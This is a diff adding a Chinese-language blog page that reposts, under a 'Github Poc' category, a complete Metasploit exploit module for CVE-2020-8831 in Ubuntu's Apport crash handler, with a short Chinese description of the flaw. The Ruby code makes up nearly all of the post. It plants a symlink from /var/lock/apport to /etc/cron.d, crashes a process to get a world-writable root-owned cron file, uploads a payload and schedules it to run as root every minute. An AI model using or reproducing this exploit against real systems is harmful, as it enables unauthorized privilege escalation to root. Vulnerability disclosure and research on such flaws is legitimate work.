@@ -1,0 +1,666 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lianccc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞名称： Apport Symlink Hijacking Privilege Escalation 漏洞编号：  CVE： CVE-2020-8831  漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 在Ubuntu Xenial Xerus 16.04.7等版本中，Apport 2.20崩溃处理器易受符号链接劫持攻击。崩溃后，Apport会将报告写入&#x2F;var&#x2F;lock">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apport Symlink Hijacking Privilege Escalation">
+<meta property="og:url" content="http://example.com/2025/06/04/github_4270121243/index.html">
+<meta property="og:site_name" content="liancc&#39; infos blog">
+<meta property="og:description" content="漏洞名称： Apport Symlink Hijacking Privilege Escalation 漏洞编号：  CVE： CVE-2020-8831  漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 在Ubuntu Xenial Xerus 16.04.7等版本中，Apport 2.20崩溃处理器易受符号链接劫持攻击。崩溃后，Apport会将报告写入&#x2F;var&#x2F;lock">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-04T14:15:17.964Z">
+<meta property="article:modified_time" content="2025-06-04T14:15:17.960Z">
+<meta property="article:author" content="lianccc">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="rapid7&#x2F;metasploit-framework:github issues">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Apport Symlink Hijacking Privilege Escalation - liancc&#39; infos blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Apport Symlink Hijacking Privilege Escalation"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-04 14:15" pubdate>
+          2025年6月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          706 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Apport Symlink Hijacking Privilege Escalation</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>漏洞名称：</strong> Apport Symlink Hijacking Privilege Escalation</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2020-8831</li>
+</ul>
+<p><strong>漏洞类型：</strong> 权限提升</p>
+<p><strong>漏洞等级：</strong> 高危</p>
+<p><strong>漏洞描述：</strong> 在Ubuntu Xenial Xerus 16.04.7等版本中，Apport 2.20崩溃处理器易受符号链接劫持攻击。崩溃后，Apport会将报告写入&#x2F;var&#x2F;lock&#x2F;apport&#x2F;lock，攻击者可以通过&#x2F;var&#x2F;lock&#x2F;apport创建指向特权目录的符号链接，从而创建具有全局0777权限的文件。此模块利用此弱点，通过创建指向&#x2F;etc&#x2F;cron.d&#x2F;的符号链接来写入系统crontab，该crontab将以提升的权限执行有效载荷。</p>
+<p><strong>产品厂商：</strong> Ubuntu</p>
+<p><strong>产品名称：</strong> Apport</p>
+<p><strong>影响版本：</strong> 2.20.11</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/31bfb0407bee930c355ee6e86ea4fa601054f8e7/modules%2Fexploits%2Flinux%2Flocal%2Fcve_2020_8831_apport_symlink_privesc.rb">https://github.com/rapid7/metasploit-framework/blob/31bfb0407bee930c355ee6e86ea4fa601054f8e7/modules%2Fexploits%2Flinux%2Flocal%2Fcve_2020_8831_apport_symlink_privesc.rb</a></p>
+<p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Local</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">NormalRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Post::Linux::System</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Post::Linux::Kernel</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Post::File</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::EXE</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-comment"># other places besides crontab </span><br>    <span class="hljs-comment"># /etc/init.d</span><br>    <span class="hljs-comment"># ~/.bashrc</span><br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Apport Symlink Hijacking Privilege Escalation &#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          On some Ubuntu releases such as Xenial Xerus 16.04.7 the Apport 2.20 crash handler is vulnerable</span><br><span class="hljs-string">          to symlink hijacking. Following a crash Apport will write reports to /var/lock/apport/lock,</span><br><span class="hljs-string">          an attacker who can create a symlink to a privileged directory via /var/lock/apport will be</span><br><span class="hljs-string">          able to create files with global 0777 permissions. This module exploits this weakness by creating a</span><br><span class="hljs-string">          symbolic link to /etc/cron.d/ in order to write a system crontab that will execute a payload with</span><br><span class="hljs-string">          elevated permissions.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Maximilien Bourgeteau&#x27;</span>, <span class="hljs-comment"># Discovery</span><br>          <span class="hljs-string">&#x27;gardnerapp&#x27;</span> <span class="hljs-comment"># Metasploit</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<br>            [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://nostarch.com/zero-day&#x27;</span>], <span class="hljs-comment"># pg. 59</span><br>            [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://ubuntu.com/security/CVE-2020-8831&#x27;</span>],<br>            [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1862348&#x27;</span>],<br>            [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2020-8831&#x27;</span>],<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;linux&#x27;</span>],<br>        <span class="hljs-string">&#x27;SessionTypes&#x27;</span> =&gt; [<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;meterpreter&#x27;</span>],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Linux_Binary&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARCH_AARCH64</span>, <span class="hljs-variable constant_">ARCH_X64</span>]<br>            &#125;<br>          ],<br>          [<br>            <span class="hljs-string">&#x27;Linux_Command&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2 April 2020&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARTIFACTS_ON_DISK</span>, <span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br>    register_options [<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_FILENAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Name of payload&#x27;</span>, <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha(<span class="hljs-number">8</span>..<span class="hljs-number">12</span>)]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;CRON_INTERVAL&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Specify how often the Cron should run. Default is every minute.&#x27;</span>, <span class="hljs-string">&#x27;* * * * *&#x27;</span>])<br>    ]<br>     register_advanced_options [<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;WRITABLE_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;A directory where we can write files&#x27;</span>, <span class="hljs-string">&#x27;/tmp&#x27;</span>])<br>    ]<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    <span class="hljs-comment"># If you are testing the module apport needs to be reinstalled on boot every time with</span><br>    <span class="hljs-comment"># sudo dpkg -i apport_2.20.11-0ubuntu21_all.deb </span><br>    <span class="hljs-comment"># sudo rm -rf /var/lock/apport/ /tmp/payload /etc/cron.d/lock &amp;&amp; unlink /var/lock/apport -&gt; must be run after each subsequent test!</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span>(<span class="hljs-string">&#x27;Platform is not Linux&#x27;</span>) <span class="hljs-keyword">unless</span> session.platform == <span class="hljs-string">&#x27;linux&#x27;</span><br><br>    <span class="hljs-comment"># Check apport version</span><br>    <span class="hljs-keyword">if</span> !command_exists?(<span class="hljs-string">&#x27;apport-cli&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span>(<span class="hljs-string">&#x27;apport-cli does not appear to be installed or in the $PATH&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    apport = cmd_exec(<span class="hljs-string">&#x27;apport-cli --version&#x27;</span>).to_s<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Detected</span>(<span class="hljs-string">&#x27;Unable to determine apport version&#x27;</span>) <span class="hljs-keyword">if</span> apport.blank?<br><br>    <span class="hljs-comment"># todo determine if prior versions of apport are vulnerable</span><br>    apport_version = <span class="hljs-title class_">Rex::Version</span>.new(apport.split(<span class="hljs-string">&#x27;-&#x27;</span>).first)<br><br>    vulnerable_version = <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-string">&#x27;2.20.11&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> apport_version == vulnerable_version<br>      vprint_good(<span class="hljs-string">&quot;Apport appears to be vulnerable.&quot;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Appears</span><br>    <span class="hljs-keyword">end</span> <br><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment"># Crash Apport and hijack a symlink</span><br>  <span class="hljs-comment"># this will creat a rwx /etc/cron.d/lock owned by root</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">hijack_apport</span><br>    <br>    print_status(<span class="hljs-string">&quot;Creating symlink...&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> exists? <span class="hljs-string">&#x27;/var/lock/apport&#x27;</span><br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:BadConfig</span>, <span class="hljs-string">&#x27;/var/lock/apport already exists. Try removing this directory then running the module again. &#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <br>    link = cmd_exec (<span class="hljs-string">&#x27;ln -s /etc/cron.d /var/lock/apport&#x27;</span>)<br>    print_status(link)<br><br>    <span class="hljs-comment"># Create crash and trigger apport</span><br>    print_status(<span class="hljs-string">&quot;Triggering crash...&quot;</span>)<br>    cmd_exec <span class="hljs-string">&#x27;sleep 10s &amp; kill -11 $!&#x27;</span><br><br>    <span class="hljs-variable">@cron</span> = <span class="hljs-string">&#x27;/etc/cron.d/lock&#x27;</span><br><br>    <span class="hljs-comment"># Make sure it&#x27;s writable and owned by root</span><br>    <span class="hljs-keyword">unless</span> exist?(<span class="hljs-variable">@cron</span>) <br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NotFound</span>, <span class="hljs-string">&#x27;Exploit was unable to create a crontab owned by root.&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_good(<span class="hljs-string">&quot;Successfully created /etc/cron.d/lock&quot;</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_payload</span><br>    print_status <span class="hljs-string">&#x27;Uploading payload..&#x27;</span><br><br>    payload_dir = datastore[<span class="hljs-string">&#x27;WRITABLE_DIR&#x27;</span>]<br><br>    payload_dir += <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">unless</span> payload_dir.ends_with? <span class="hljs-string">&#x27;/&#x27;</span><br><br>    payload_file = datastore[<span class="hljs-string">&#x27;PAYLOAD_FILENAME&#x27;</span>]<br><br>    <span class="hljs-variable">@payload_dest</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;payload_dir&#125;</span><span class="hljs-subst">#&#123;payload_file&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># create the payload</span><br>    <span class="hljs-keyword">if</span> target.arch.first == <span class="hljs-variable constant_">ARCH_CMD</span><br>      upload_and_chmodx <span class="hljs-variable">@payload_dest</span>, payload.encoded<br>    <span class="hljs-keyword">else</span><br>      upload_and_chmodx <span class="hljs-variable">@payload_dest</span>, generate_payload_exe<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_cron</span><br>    cron_interval = datastore[<span class="hljs-string">&#x27;CRON_INTERVAL&#x27;</span>]<br>    data = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;cron_interval&#125;</span> root <span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_dest</span>&#125;</span>\n&quot;</span><br>    write_file(<span class="hljs-variable">@cron</span>, data)<br>    <span class="hljs-comment"># crontab won&#x27;t execute as root if group/other is writable</span><br>    print_good <span class="hljs-string">&quot;Successfully wrote crontab!&quot;</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:BadConfig</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;WRITABLE_DIR&#x27;</span>]&#125;</span> is not writable&quot;</span>) <span class="hljs-keyword">unless</span> writable?(datastore[<span class="hljs-string">&#x27;WRITABLE_DIR&#x27;</span>])<br>    hijack_apport<br><br>    write_payload<br><br>    write_cron<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="print-no-link">#权限提升</a>
+      
+        <a href="/tags/rapid7-metasploit-framework-github-issues/" class="print-no-link">#rapid7/metasploit-framework:github issues</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Apport Symlink Hijacking Privilege Escalation</div>
+      <div>http://example.com/2025/06/04/github_4270121243/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lianccc</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/06/04/github_2958453519/" title="Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/04/github_2185986903/" title="Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution">
+                        <span class="hidden-mobile">Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
